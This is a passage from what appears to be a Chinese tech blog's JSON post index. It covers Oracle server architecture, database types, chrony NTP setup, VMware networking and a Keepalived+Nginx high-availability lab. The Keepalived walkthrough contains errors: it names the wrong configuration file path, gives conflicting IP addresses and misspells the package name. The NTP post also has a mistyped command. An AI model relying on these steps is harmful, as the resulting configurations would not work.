会自动生成重做项，首先要将这些缓冲区的变化记载到“重做日志缓冲区”中。\n重做日志缓冲区由一条一条的重做项构成，每条重做项记载了修改的时间、被修改的块、修改位置以及新数据。缓冲区被循环使用，当重做日志缓冲区填满时，数据库系统将重做日志缓冲区的内容写入日志文件。在系统发生故障时，可以通过重做项重新执行对数据库的修改，实现对实例的恢复。\n共享池 共享池（Shared Pool）内包含了库缓存（Library Cache），数据字典缓冲区（Dictionary Cache），并行执行消息缓冲区（Buffers for parallel execution messages），以及用于系统控制的各种内存结构。\n数据字典缓冲区：数据字典被存放在 SYSTEM 表空间的数据文件中，是一系列保存了数据库重要参考信息（账户、数据文件、表的描述、用户权限等）的表和视图。执行任何 SQL 语句都需要访问数据字典。\n视图有三种实例： user_*(当前用户所拥有对象的有关信息) all_*(当前用户可访问对象的信息) dba_*(数据库中所有对象的信息) 例如，当用户执行\u0026quot;SELECT * FROM emp WHERE empno=7788\u0026quot;语句时，Oracle 需要查询数据字典 dba_tables 确定表 emp 是否存在；如果该表已经存在，还需要查询数据字典dba_tab_columns 确定列 empno 在表 emp 中是否存在，然后才能生成执行语句的过程（执行计划）。这些定义在首次查询时存入数据字典高速缓冲区，在后续过程中用到就可以直接使用，而不必重新查询数据字典。\n库高速缓冲区：又可分为共享 SQL 区和共享 PL/SQL 区。\n共享 SQL 区用来存放最近执行的 SQL 语句信息，包括语句文本、解析树及执行计划，通过**上下文区(Context Area)**来实现。相同格式的SQL在解析时可以共享上下文区，减少解析次数，提升性能。\n共享PL/SQL区用来存放最近执行的PL/SQL语句，解析和编译过的程序单元和过程（函数、包和触发器）也存放在此区域。\n大池 供一次性大量的内存分配使用，例如：\n● I/O 服务进程\n● Oracle 备份与恢复操作\n大池能够更好地满足此类大量内存分配的要求。\nJava池和流池 Java 池供各会话内运行的 Java 代码及 JVM 内的数据使用。\n流池主要用于缓存流进程在数据库间移动或复制数据时使用的队列消息。\n想象你有一个大的仓库（数据库），里面存着很多货物（数据）。现在，你想把这些货物（数据）快速地搬运到另一个仓库（可能是另一个数据库，或者是数据库内的另一个部分）去。Oracle流池就像是你在搬运过程中使用的一个临时存放区或者是一个快速通道。 PGA 当客户进程访问 Oracle 服务器时，会在 Oracle 服务器端为用户进程分配相应的服务进程，并且为该服务进程分配相应的内存空间来存放其数据和控制信息，每一个后台进程也同样需要为其分配专用的存储空间，这块内存空间被称为程序全局区(Program Global Area 或Process Global Area )。\n所有进程都可共享 SGA，而 PGA 是非共享的。\nPGA内部大致分三个区域：\n会话内存：是为会话变量和会话有关信息分配的内存。 SQL工作区：用于排序（Sort）哈斯连接（Hash-join）位图（Bitmap）合并和位图创建。 私有 SQL 区：存储了执行SQL语句时所需的各种信息，包括绑定变量、查询执行状态、工作区域等。 进程结构 Oracle 的进程分为用户进程、服务器进程和后台进程。\n用户进程是在客户机内存上运行的程序，在用户请求连接 Oracle 数据库时建立。用户进程不能直接同 Oracle 服务器交互，而是把操作请求提交给服务进程。服务进程是在用户同 Oracle 数据库建立会话之后自动在服务器端创建的进程。服务进程直接同 Oracle 服务器交互，执行用户请求并返回结果。服务进程有专有和共享之分。\n后台进程属于 Oracle 实例的一部分，Oracle 的后台进程的作用是对数据进行操作，并维护数据库系统，使其始终处于良好的状态。\n在这里我们着重说明后台进程。\n一个 Oracle 实例中可以包含多种后台进程，这些进程不一定全部出现在实例中。系统中运行的后台进程数量众多，用户可以通过 V$BGPROCESS 视图查询关于后台进程的信息。\n● 系统监控进程（SMON），主要任务是实例启动时执行恢复性工作，对有故障数据库实例进行恢复。\n● 进程监控进程（PMON），主要任务用于恢复失败的用户进程。\n● 数据库写入进程（DBWn），将修改后的数据块内容写回数据文件。\n● 日志写入进程（LGWR），将内存中的日志内容写入日志文件。\n● 检查点进程（CKPT），启动检查点，用于减少数据库实例恢复所需要的时间。\n● 归档进程（ARCn），当数据库服务器以归档方式运行时调用该进程完成日志归档。\n● 恢复进程（RECO），用于分布式数据库中的失败处理。\n● 锁进程（LCKn），在并行服务器模式下确保数据的一致性。\n● 调度进程（Dnnn），负责把用户进程分配到可用的服务进程进行处理。\nLGWR日志写入进程（Log Writer） LGWR 日志写入进程负责将重做日志缓冲区的日志条目写入磁盘上的联机日志文件。上文的重做日志缓冲区满了之后，就是这个进程帮助写入磁盘。\n在出现以下情况时 LGWR 会开始工作：\n在 DWBR 进程将脏缓冲区写入数据文件之前。//预写协议\n在重做日志记录达到缓冲区的三分之一。\n日志缓冲区记录的日志多于 1M。\n每隔 3 秒钟。//重做日志缓冲区是循环使用的，要腾出足够的空间给新的记录使用\n提交事务（执行 Commit）。//提交事务相当于确定保存修改，不存入日志文件就有丢失的可能\nOracle 总是先记载数据变化到重做日志缓冲区，然后才修改数据高速缓存。与之类似，在后台进程 DBWn 将脏缓冲区写入到数据文件之前，首先要由后台进程 LGWR 将重做日志缓冲区写入到重做日志中。与数据高速缓存相比，重做日志缓冲区相对要小得多，但写入频率高的多。\nOracle 采用了快速提交机制，当执行 COMMIT 操作时，并不是将“脏缓冲区”数据写入到数据文件中，而是将重做日志缓冲区的内容写入到重做日志文件中，以确保数据库完整性。\nDBWn 数据库写入进程（Database Writer） 数据库写入进程负责将数据库高速缓冲区（脏缓冲区）的内容写入到数据文件。\n可以配置额外的进程（DBW0-DBW9，最多 10 个进程），以提高写入性能，通过设置初始化参数DB_WRITER_PROCESSES 来完成。\n在出现以下情况时 DBWn 进程会开始工作：\n● 系统发出检查点指令。//同步数据，详见检查点进程（CKPT）。\n● 脏缓冲区个数达到指定阀值。\n● 服务进程搜索一定数目的数据块后，不能找到自由缓冲区。\n● 数据写入计时时间到。\n//客户端执行 SELECT\\INSERT\\UPDATE\\DELETE 语句时，都需要访问数据库高速缓冲区。如果是第一次访问，必须要将数据由数据文件读取到数据库高速缓冲区，所以 Oracle 必须要确保数据高速缓存总是存在足够的“自由缓冲区”以容纳新数据。当 DBWn 进程将脏缓冲区的数据块写入到数据文件后，Oracle 将把“脏缓冲区”标记为“自由缓冲区”。因此，为了保证有足够“自由缓冲区”来存放新的数据块，需要 DBWn 进程工作。\n● 表空间脱机或进入只读状态。\n● 执行删除或截断表操作。\n● 执行 ALTER TABLESPACE … BEGIN BACKUP 命令//需要同步数据，原理同检查点。\nCKPT 检查点进程（Checkpoint） CKPT 检查点进程的作用是执行一个“检查点”，同步数据库的所有数据文件、控制文件和重做日志文件。\n当执行检查点时，系统促使 DBWn 将数据缓冲区中数据的变化写入数据文件，同时完成对数据文件和控制文件的更新，记录下当前数据库的结构和状态。在执行一个检查点之后，数据库处于一个完整状态。在数据库发生崩溃后，可以将数据库恢复到上一个检查点。\n进程 CKPT 在以下情况下会开始工作：\n● 发生日志切换。\n● 关闭实例(SHUTDOWN ABORT 除外)。\n● 手工执行检查点操作。\n● 由初始化参数 LOG_CHECKPOINT_INTERVAL 和LOG_CHECKPOINT_TIMEOUT 强制发出。\n初始进程过程 现在我们已经讲完了Oracle最最重要的几个进程，可以采用一个数据写入的例子加深一下理解。\n假设现在有一张员工工资表，员工号 7899 的员工张三工资为 8000，现在为其加薪到 10000。\n1\u0026gt; 此时，第一次读取，需要将数据从数据文件读入数据库高速缓冲区。\n2\u0026gt; 数据读入数据库高速缓冲区后，我们修改数据的条目先记录入重做日志缓冲区。\n3\u0026gt; 接着新数据被写入数据库高速缓冲区\n4\u0026gt; 提交，LGWR 进程将条目从重做日志缓冲区写入联机重做日志文件\n5\u0026gt; 执行检查点 CKPT，同步数据库。发现联机日志文件为最新，同步更新数据文件、控制文件，触发了 DBWn 进程。此时数据才发生了真正的改变。\nSMON 系统监控进程（System Monitor） SMON 系统监控进程主要作用是强制对数据库进行恢复操作。\n在实例启动时，如果上一次数据库是非正常关闭，并且重做日志文件和控制文件的 SCN 值是不同的，Oracle 将自动在重新打开数据库之前，通过执行重做日志文件的记录，来同步所有数据文件、控制文件和重做日志文件，确保所有数据库文件的一致性，然后才打开数据库。\n该进程还负责在启动实例时清理临时段和合并区（Extent）碎片等工作。\n所以 SMON进程的工作归纳如下：\n● 进行实例恢复\n● 合并数据文件的自由空间\n● 释放数据文件的临时段\nPMON 进程监控进程（Process Monitor） PMON 进程监控进程负责对失败的用户进程或服务进程进行恢复。\n当用户进程连接到Oracle 服务器时，Oracle 将在服务器端分配相应的服务进程。这时由 PMON 进程来监视用户进程的执行情况。当由于种种原因，用户对 Oracle 数据库的连接，发生崩溃、挂起或异常终止现象时，该进程负责清除服务进程所占用的资源，回滚没有完成的事务。\n当 PMON 检测到用户进程失败时，进行的工作归纳如下：\n● 回滚当前用户的事务\n● 释放当前用户加的表或行级锁\n● 释放用户的其他资源\n● 重新启动死掉的调度进程\nSQL语句在RDBMS是如何运作的 以上五个进程，是Oracle中必须的五个进程，相信现在已经有了一定的了解，现在我们完整梳理下SQL语句在RDBMS是如何运作的。\n1.将SQL语句加载入数据库缓冲区 2.将SQL语句要操作的数据文件副本加载入数据库缓冲区 3.执行SQL语句，修改数据文件副本，形成“脏缓冲区” 4.CKPT检测到“脏缓冲区”，调用DBWn 5.在DBWn运行之前，先运行了LGWR，将数据文件的原始状态和数据库的改变记录到Redo Log Files 6.运行DBWn，将“脏缓冲区的内容写入到数据文件” 7.同时CKPT修改控制文件和数据文件头 8.SMON回收不必要的空闲资源\nARCn 归档进程（Archive） ARCn 归档进程完成日志的归档备份，是一个可选后台进程，但是也十分重要。\n当数据库运行于归档日志模式（ARCHIVELOG）下时，负责将已写满的重做日志文件复制到归档日志目标文件中，这样可以保留所有的重做记录。\nRECO 恢复进程（Recover） RECO 恢复进程负责在分布式数据库（Distributed Database）环境下,自动恢复失败的分布式事务。当某个分布式事务由于网络连接故障或者其他原因失败时，RECO 进程将会尝试与该事物相关的所有数据库进行联系，已完成对失败事物的处理工作。\nDnnnn 调度进程 Dnnnn 调度进程是多线程服务器体系结构的一部分，调度进程接受用户进程的请求，将他们放入到请求队列中，然后为请求队列中的用户进程分配一个服务进程。\nOracle 数据库 数据库是数据存储的容器，作用是用来收集、存储数据和返回信息。\nOracle 数据库的物理结构包括两个部分，分别是数据库文件（控制+数据+重做日志）和操作系统文件。\n控制文件（Control Files） 控制文件是一个很小的二进制文件，用于记录和维护数据库结构（数据库名、数据文件的名称和路径、联机重做日志文件的名称和路径、备份信息等），每个 Oracle 数据库可以有1-8 个控制文件，最少要包含一个控制文件。\n数据文件（Data File） 数据文件是用于存储数据库数据的物理文件，它由若干个操作系统文件组成，在数据文件中存储着用户数据(表、索引等)、数据字典以及回滚段数据等。\n没错，这才是我们一般意义理解上的“数据库”。\n联机重做日志文件（Online Redo Log File） 我们知道重做日志缓冲区是循环使用的：当重做日志缓冲区的重做项被写入联机重做日志文件后，重做日志缓冲区的内容可以被覆盖。\n日志文件也是循环使用的，当联机重做日志文件中记录的数据已经同步写入数据文件，联机重做日志文件中的内容也可以被覆盖。但是这种循环以组的方式循环。\n操作系统文件 初始化参数文件（Initialization Parameter File）：定义了 Oracle 实例的各项参数，初始化参数文件一般默认存放在$ORACLE_HOME/dbs路径下。\n初始化参数文件分为静态初始化参数文件和动态初始化参数文件。静态初始化参数文件为文本格式，可以用 vi 编辑器编辑，默认名为 initsid.ora；动态初始化参数文件为二进制格式，不可以用 vi 编辑器编辑，默认名为 spfilesid.ora\n口令文件（Password File）：存放特权用户信息及其口令。“特权用户”是指具有启动、关闭Oracle 服务器并建立数据库等特殊权利的用户。如具有 SYSDBA、SYSOPER、SYSASM权限的用户。\n归档日志文件（Archive Log File）\n归档日志文件用于记录联机重做日志文件中的内容。\n我们知道，联机重做日志文件以日志组的形式存在，并且循环使用。也就是说，如果联机重做日志文件被覆盖以后数据库发生故障，由于日志已经覆盖，将会导致数据库无法恢复。\n我们把联机重做日志以脱机的形式存放在归档日志文件里，既可以保证日志不会丢失，又可以保证不影响数据库的正常运行。\n追踪文件（Trace File）和警告文件（Alert Log File） 追踪文件用于存放后台进程和服务器进程的跟踪信息。每个后台进程都有相应的跟踪文件，存放着后台进程的警告和错误信息。服务器进程跟踪文件用于存放 SQL 语句的跟踪信息，该类文件会记载 SQL 语句的执行时间、执行计划等信息等。\n警告文件由连续的消息和错误组成。通过查看警告文件，可以查看到 Oracle 内部错误、块损坏错误以及非默认的初始化参数值，并且可以监视特权用户的所有操作，例如启动、关闭数据库。\n","date":"2024-07-03T14:48:43+08:00","permalink":"https://proben1.github.io/2024/oracle%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BB%93%E6%9E%84/","title":"Oracle服务器结构"},{"content":"前言 我们从一个不等式开始：会SQL≠会数据库\nSQL是结构化查询语言（Structured Query Language）的缩写，用来访问和操作关系型数据库系统。\n这里出现了两个概念，分别是：关系型、数据库系统。\n什么是数据库系统（DataBase System）？什么叫关系型？还有非关系型？\n数据库系统=数据库+硬件+软件+人\n数据库：数据库（DataBase），是按照数据结构来组织、存储和管理数据的仓库。 硬件：构成计算机系统的各种物理设备。 软件：包括操作系统、数据库管理系统及应用程序。数据库管理系统（Database Management System，DBMS）是数据库系统的核心软件，科学地组织和存储数据，高效获取和维护数据。 人：广义上讲包括四类，这里只说数据库管理员（Data Base Administrator，DBA）。 既然我们使用DBMS来管理数据库，现在眼前有两种选择：关系型数据库（SQL 数据库）和非关系型数据库（No SQL 数据库）。\n关系型数据库 关系型数据库使用 SQL，来编写数据库查询和数据库进行通信。查询可以是用于执行任何 CRUD（创建、读取、更新、删除）操作的命令。\nPostgreSQL Microsoft SQL Server MySQL Oracle SQLite 关系数据库以结构化和表的方式存储数据。也就是说，它将信息存储在表中，可以将其视为数据的存储容器。\n关系数据库具有严格的、静态的预定义逻辑架构（schema）。可以将数据库架构视为一个组织蓝图——一组规则：哪些可以插入表、哪些不能插入表、以及如何设置数据。\n在每个表中，至少有一个列（column）。这些列具有特定的数据类型，例如 INTEGER 或 VARCHAR。\n一个表也会包含**行（rows）**或 记录（records）。记录是遵守预定义架构的单个数据条目。本质上，它是一个数据项。\n此外，一个关系数据库可以有多个表，这些表可以是相互关联的。关系数据库有一个主键，它作为标识符，确保表中的每一项都是唯一的，从而确保表中没有重复和冗余的数据。外键 用于表示在表之间的关系，比如1:1、1:n或者是n:n。\n关系数据库提供 ACID 数据一致性模型。原子性（Atomicity）、一致性（Consistency）、事务隔离（Isolation）、持久性（Durability）。\n原子性意味着事务是原子的并且采取 “all or nothing” 的方法。也就是，要么整个操作成功，从头到尾完成，要么不成功，整个操作“回滚”。所有操作都保证以成功或失败结束，不存在部分成功。\n一致性是确保数据库结构从事务开始到结束保持不变。一致性确保进入数据库的任何数据都遵循已设置的规则和约束。它可以保护和维护关系数据库中数据的完整性。\n事务隔离意味着尽管在任何时候都发生了许多事务，但每个事务都被视为一个原子的、独立的单元，并且事务似乎是按顺序发生的。\n例如，如果两个事务同时发生，此属性可确保一个事务以及那里发生的更改不会以任何方式影响另一个事务。\n最后，持久性意味着事务的任何结果和更改都已提交，因此是永久性的，并且将持续存在，即使出现系统故障也是如此。\nACID 模型可确保数据库可靠且安全。\n非关系数据库 非关系数据库都是指不使用关系数据模型的数据库。无论是“Not only SQL”还是“Non-SQL”。\nMongoDB Redis 非关系数据库不以表格式存储和组织数据。不同数据点之间没有表、行、列或关系。数据存储在集合中。数据库通常是非结构化的并使用动态架构。\n1、键值（Key-Value）存储\n键-值数据库是最简单的非关系数据库类型之一。数据以键值对集合的形式存储在字典或哈希表中。这种类型的数据库具有唯一的键。键充当指向特定值的指针并与该值相关联。分配给键的值可以是任何信息和数据类型。要检索和访问该值，请使用唯一键作为引用。\n优点：查询快 缺点：数据无结构化，通常只被当做字符串和二进制数据存储 应用场景：内容缓存、用户信息（会话、配置信息、购物车等），主要处理大量数据的高访问负载 代表：Redis、Memcached 2、文档（Document-Oriented）存储\n面向文档的数据库也以键值对的方式存储数据。但是其值是一个文档，它有一个唯一的键作为它的标识符。文档可以是任何格式，例如 XML、YAML 或二进制，通常采用 JSON 格式。这种类型的数据库以半结构化的方式存储数据。没有架构或预定义的结构。正因为如此，它更灵活，可以在项目需求发生变化时重新安排和重新设计数据库结构。它还提供了类似 SQL 的查询语言或者通过 API 来对数据执行查询以及 CRUD 操作。\n优点：数据结构要求不严格，表结构可变 缺点：查询性能不高，缺乏统一的查询语法 应用场景：日志、Web应用 代表：Mongdb、CouchDB 3、列（Wide Column Store/Column-Family）存储\n列式数据库在概念上类似于关系数据库，但它们使用组或列集（也称为列族）而不是行来逻辑组织相关数据。可以通过使用与单个列关联的唯一行键来独立访问列族。列式数据库搜索特定数据的速度很快，因为无需通过不相关的信息行来查找要搜索的内容。\n优点：列存储查找速度快，可扩展行强，更容易进行分布式扩展，适用于分布式的文件系统，应对分布式存储的海量数据 缺点：查询性能不高，缺乏统一的查询语法 应用场景：日志、分布式文件系统（对象存储）、时空数据、推荐画像、消息/订单等。 代表：Cassandra、Hbase 4、图形（Graph-Oriented）存储 特点：图数据库是最复杂的非关系数据库类型，它们可以处理大量数据。图数据库专注于数据元素之间的连接和关系，并使用图论来存储、搜索和管理这些关系。图数据库使用 nodes 来存储数据，用 nodes 表示单个实体或数据。一个节点连接到另一个节点。为了表示实体之间的连接或关系，图数据库还用到了 edges。\n优点：图形相关算法。比如最短路径寻址，N度关系查找等 缺点：有时需要对整个图计算才能得出需要信息，分布式的集群方案不好做，处理超级节点乏力，没有分片存储 应用场景：社交网络、推荐系统等。专注于构建关系图谱。 代表：Neo4j、Infinite Graph 非关系数据库提供 BASE 数据库一致性模型。该模型不像关系数据库的 ACID 模型那样严格。\nBASE 是以下的首字母缩写词：\nBasic Availability 基本可用，该模型不关注数据的即时一致性。但是，该系统在持续工作，并始终保证数据的可用性。 Soft 软状态，由于缺乏即时一致性，系统的状态可能会随着时间而改变。软状态意味着系统不需要写一致性。 Eventual 最终一致性，主要优先事项是数据的持续可用，而不是数据一致性。但是，最终在某个时候，可以期望数据是一致的。当系统停止接收输入时，可能会发生这种情况。 二者对比 SQL数据库\n需要分布在多个表中的高度结构化的数据，需要数据遵守严格的、可预测的、预定义的和已经计划好的模式。 数据将保持相对不变。如果不打算频繁更改数据库的结构并且不需要定期更新项目，SQL 数据库会很方便。请记住，它们提供的灵活性很小。 需要一致的数据。 数据完整性和安全性是重中之重。 需要复杂查询的准确结果。 SQL 数据库的一个缺点是它们是垂直扩展的。当存储变多时，需要增加当前机器上的硬件和提高计算能力。这可能代价高昂。需要增加处理能力和内存存储来处理增加的负载以提高性能。\n但是SQL可以确保数据的完整性和一致性，并且快速查询。\nNoSQL 数据库\n在一个快速的开发环境中工作，需要经常调整需求并不断更改数据库结构。 正在处理大量性质不同但不需要大量结构或准确性的数据。 正在处理需要频繁更新的数据。NoSQL 数据库提供了一个松散、灵活和动态的模式，允许对数据进行定期更改。 需要快速的查询结果和系统的持续可用性。 不想对数据库进行任何前期规划、准备或设计，而是想立即开始构建。 NoSQL 数据库的一大优势是它们可以水平扩展。它们的设计方式可以将更多机器添加到现有机器（例如云服务器）中。与需要额外 CPU（中央处理单元）或 RAM（随机存取存储器）资源的垂直缩放相比，这种行为更可取。\n但当然，NoSQL 数据库的一个缺点是它们不能确保数据的完整性和一致性。\n分析型数据库 我们根据数据库存储数据的模式，将它们分为关系型和非关系型。而根据数据库的作用，我们还可以划出另一种分类方式：分析型数据库。\n分析数据库是面向分析应用的数据库，与传统的数据库不同，它可以对数据进行在线统计、数据在线分析、即时查询等，从而发掘数据的价值信息。\nOLTP(OnLine Transaction Processing)；OLTP 是能够提供实时在线处理事务，同时保证实时强一致性的关系型数据库，也称交易型数据库。开源产品有：MySQL、PostgreSQL。可以理解成传统的关系型数据库的主要应用，主要是基本的、日常的事务处理，例如银行交易。\nOLAP(Online Analytical Processing)：OLAP 是指支持对大规模数据进行较为复杂的联机分析处理的关系型数据库。开源产品有：Greenplum、Doris、Clickhouse、Kylin、Impala、Sparksql、Druid、Hive、Presto。是数据仓库系统的主要应用，支持复杂的分析操作，侧重决策支持，并且提供直观易懂的查询结果。\nHTAP (Hybrid Transactional/Analytical Processing)：HTAP 是指能够同时支持在线事务处理和复杂数据分析的关系型数据库。广义的 HTAP 指的是同时支持 OLTP 和 OLAP 查询的数据库，而狭义的 HTAP 指的是同时支持行存列存 OLTP 和 OLAP 查询的数据库。\n","date":"2024-07-03T10:50:55+08:00","permalink":"https://proben1.github.io/2024/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E6%A6%82%E8%BF%B0/","title":"数据库类型概述"},{"content":"网络时间协议NTP（Network Time Protocol）是TCP/IP协议族里面的一个应用层协议，用来使客户端和服务器之间进行时钟同步，提供高精准度的时间校正。 NTP服务器从权威时钟源（例如原子钟、GPS）接收精确的协调世界时UTC，客户端再从服务器请求和接收时间。\n在以前，ntp服务使用ntpd（“d” stands for “Daemon”），现在使用chronyd，它使用连续修正（通过减慢时钟或者加快时钟的方式连续的修正）而非直接调整时间，不会出现间断，并且比ntpd更加精准。\n对于机房内的机器，可以采用二级时间校正，即配置一台连接权威时钟源chronyd服务器后，通过这台服务器像其他客户端提供chronyd服务。\n配置命令如下，首先确保ntpd的关闭，systemctl is-enabled ntpd\necho \u0026#39;server 10.xxx.xxx.xxx iburst\u0026#39; \u0026gt;\u0026gt; /etc/chrony.conf systemctl restart chronyd 可以通过多种方式查看chronyd服务的开启或者状态：\nsystem status chronyd date chronyc tracking timedatectl chronyc sourcestats ","date":"2024-06-28T10:53:01+08:00","permalink":"https://proben1.github.io/2024/ntp%E6%9C%8D%E5%8A%A1/","title":"NTP服务"},{"content":"从大一就开始装虚拟机，苦其网络久已，今日学成归来，我观虚拟网络，如插标卖首！\n类别 VMware虚拟机常见的网络类型有**bridged（桥接）、NAT（地址转换）、host-only（仅主机）**三种。\nhost-only 虚拟机的网卡会连接到宿主的VMnet1上，宿主系统并不为虚拟机提供任何路由服务，因此虚拟机只能和宿主机进行通信，不能连接到实际网络上。好处是可以配置静态ip是不局限于同一个网段，可以作为虚机之间的心跳线使用。\nBridged 桥接模式直接把虚机连入到了实际网络中，被分配与物理主机相同网段的独立IP，和网内真实计算机所处的网络位置是一样的。\n但是一般情况下，真实机器都采用dhcp的方式接入网络，换了个地理位置，就换了个ip，不适合需要配静态IP的虚机。\nNAT NAT（Network Address Translation），网络地址转换，虚拟机的网卡连接到宿主机的VMnet8上，采用主机上的VMware NAT Service服务充当路由器，将虚拟机发到VMnet8的包进行地址转换之后发到实际的网络上，再将实际网络上返回的包进行地址转换后通过VMnet8发送给虚拟机。\n这种情况下，可以采用dhcp的方式分配给虚机VMnet8的IP，也可以手动静态规划。宿主机外界IP的变化不会影响到VMnet8内的IP，非常的方便和稳定。\n下面采取最稳定的方式，配置VMnet8内的静态IP，实现虚机一直通网。\n外部配置 VMnet8网段规划：\n网段：192.168.137.0/24\n宿主机：192.168.137.1\n网关：192.168.137.2\n虚拟机：192.168.137.3—254\n在虚拟网络编辑器中确认VMnet8的子网IP和子网掩码\n打开电脑的网络和共享中心，更改网络适配器，选择VMnet8网卡，更改宿主机的在VMnet8卡里的IP，网关和DNS\n打开宿主机和外界通网的真正网卡，设置允许共享给VMnet8网卡\n外部配置完成。\n内部配置 安装好虚拟机后，ip a查看网卡，这时应该会在装系统的时候被配一个dhcp的IP，我们将它替换成静态IP。\n找到你想配置虚拟机的网卡名称后，这里以ens160为例：\n更改BOOTPROTO为static\n更改ONBOOT为yes\n加上你想要的IP地址\nsystemctl restart NetworkManager（或者network，看机型不同重启不同的网路服务）\n结束！\n","date":"2024-06-27T11:15:24+08:00","permalink":"https://proben1.github.io/2024/vmware%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/","title":"VMware网络配置详解"},{"content":"Keepalived简介 一个免费开源的轻量级别高可用解决方案，通过VRRP协议实现多台机器之间的故障转移服务。\n规划方案 master ：192.168.137.6\nbackup ：192.168.10.8\nvip ：192.168.10.11\nOS：CentOS Linux 7 (Core)\n网卡名都是ens34\n实现：vip 上跑一个Nginx服务\n思路：安装+配置+脚本+启动排错+验证\n环境安装 sudo yum -y install nginx\nsudo yum -y install keepalive\n主程序文件：/usr/sbin/keepalived.conf\n主配置文件：/usr/sbin/keepalived.conf\n服务配置 master 和backup区别：配置中的state和priority不一样\nmaster ：vi /usr/sbin/keepalived.conf\nvrrp_instance VI_1 { state MASTER interface ens34 virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.137.11/24 dev ens34 } preempt delay 60 } vrrp_script chk_nginx_port { script \u0026#34;/opt/chk_nginx.sh\u0026#34; interval 2 weight -5 fall 2 rise 1 } backup：vi /usr/sbin/keepalived.conf\nvrrp_instance VI_1 { state BACKUP interface ens34 virtual_router_id 51 priority 80 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.137.11/24 dev ens34 } preempt delay 60 } vrrp_script chk_nginx_port { script \u0026#34;/opt/chk_nginx.sh\u0026#34; interval 2 weight -5 fall 2 rise 1 } 脚本配置 vi /opt/chk_nginx.sh\n#!/bin/bash #检测nginx是否启动了 A=`ps -C nginx --no-header |wc -l` #如果nginx没有启动就启动nginx if [ $A -eq 0 ];then #重启nginx #systemctl start nginx #nginx重启失败，则停掉keepalived服务，进行VIP转移 if [ `ps -C nginx --no-header |wc -l` -eq 0 ];then killall keepalived fi fi 赋权：chmod 775 /opt/chk_nginx.sh\n启动排错 systemctl start nginx\nsystemctl start keepalived\n通过ip a可以发现vip没有启动\nsystemctl status keepalived 查看状态，发现很多中文的空格未识别，修改配置文件，删去空格，重试\nsystemctl restart keepalived\n通过ip a可以发现vip已经启动\n效果如下：\n验证 通过ip192.168.137.11可以看到nginx欢迎界面，我们在主备上修改这个界面\nvi /usr/share/nginx/html/index.html\n分别在Welcome to nginx!后加上111和222\n访问192.168.137.11可以看到111\nsystemctl stop keepalived关闭主机1的keepalived服务\n再次访问192.168.137.11可以看到222\n重新开启\n变回111\n验证成功\n","date":"2024-06-27T09:37:07+08:00","permalink":"https://proben1.github.io/2024/keepalived-nginx%E9%83%A8%E7%BD%B2%E5%AE%9E%E9%AA%8C/","title":"Keepalived+Nginx部署实验"},{"content":"High-Availability 高可用：通过设计减少系统不能提供服务的时间，简称有b计划\nHigh-Performance 高性能：快\nActive-Standby 双机热备 主服务器运行应用，备份服务器处于空闲状态，但实时监测主服务器的运行状态。一但主服务器出现异常或故障，备份服务器立刻接管主服务器的应用。\nActive-Active 双机互备 两台服务器均为工作机，均为应用系统提供支持，同时还相互监测对方状况。当任一台主机宕机时，另一台主机主动接管异常机的应用，以保证业务的不间断运行（虽然加大了正常运行主机的负载）。最常见的例子：网站服务器\nload-balancing 负载均衡 1、大量的并发访问或数据流量分担到多台节点设备上分别处理，减少用户等待响应的时间\n2、单个重负载的运算分担到多台节点设备上做并行处理，每个节点设备处理结束后，将结果汇总\nLoad-Balance就是Active Active的一种\nCluster 群集 多台主机一起工作，各自运行一个或几个服务。当某个主机发生故障时，运行在其上的服务就被其它主机接管。\nsplit-brain 脑裂 在\u0026quot;双机热备\u0026quot;高可用（HA）系统中，当联系两个节点的\u0026quot;心跳线\u0026quot;断开时(即两个节点断开联系时)，本来为一个整体、动作协调的HA系统，就分裂成为两个独立的节点(即两个独立的个体)。由于相互失去了联系，都以为是对方出了故障，\u0026ldquo;本能\u0026quot;地争抢\u0026quot;共享资源\u0026rdquo;、争起\u0026quot;应用服务\u0026quot;。\n后果：1）或者共享资源被瓜分、两边\u0026quot;服务\u0026quot;都起不来了；2）或者两边\u0026quot;服务\u0026quot;都起来了，但同时读写\u0026quot;共享存储\u0026quot;，导致数据损坏（常见如数据库轮询着的联机日志出错）。\n反向代理 你通过一个服务器去访问外面叫代理，那么外面的数据通过一个服务器再访问你就叫反向代理。\n反向代理（reverse proxy）是指用代理服务器来接受外部的访问请求，然后将请求转发给内网的上游服务器，并将从上游服务器上得到的结果返回外部客户端。作为反向代理是 Nginx 的一种常见用法。这里的负载均衡是指一种策略，争取把请求平均地分布到每一台上游服务器上。\nQ1:在应用层面，应用在两个主机上同时运行，怎么保证应用之间的一致性? 模式1：两台主机上运行的应用是同一种，但是可以互不关联相互独立完成。只需要配置好负载均衡，保证提供高性能的服务即可。\n模式2：两台主机上运行的应用是相关联的，一台产生的结果会对另一台影响。通过消息日志，存储到本地数据库或共享的消息队列，再通过业务规则自动发起作用。反过来，对于两台主机都要写入的数据，通过锁的方式，保证只有一台在输出。\nQ2:在数据层面，应用产生的数据，怎么保证一致性? 节点层面：Oracle RAC（Real Application Clusters）是Oracle数据库提供的一种数据库集群技术，专门用于实现数据库的高可用性和可扩展性。RAC允许多个数据库实例运行在不同的服务器上，共享访问相同的数据库文件，通过缓存融合（Cache Fusion）技术实现数据的一致性。RAC提供了连接负载均衡（Connection Balancing）和基于服务的负载均衡（Service-Based Load Balancing）两种方式来分散负载\n容灾层面：Data Guard。它是在主节点与备用节点间通过日志同步来保证数据的同步，可以实现数据库快速切换与灾难性恢复。这里的节点由是不同城市的机房组成。\nQ3:从Ingress来看，北向进来的业务请求，怎么做到尽量平均分摊到AA集群里的不同节点上,基于什么规则去进行分发? 通过负载均衡。包含三个方面：\n软件（nginx、LVS）硬件（F5），\n网络层次（二层、四层、七层），\n本地（机房内）全局（地理位置）。\n负载均衡分类 本地or全局 本地（主机层面考虑）：\n微观层面上的负载均衡算法：权重、轮询、最小链接数等等……很多\n全局（地理层面考虑）：\n全球某个地方发来的请求，分配给响应时间最短的、最快域名解析的机房里的服务器\n软件硬件分类 F5：硬件负载均衡器\nlvs：重量级的四层负载软件\nnginx：轻量级七层均衡(也能做4层负载, 通过stream模块)\nhaproxy：七层代理，也可以模拟四层转发\n网络层次分类 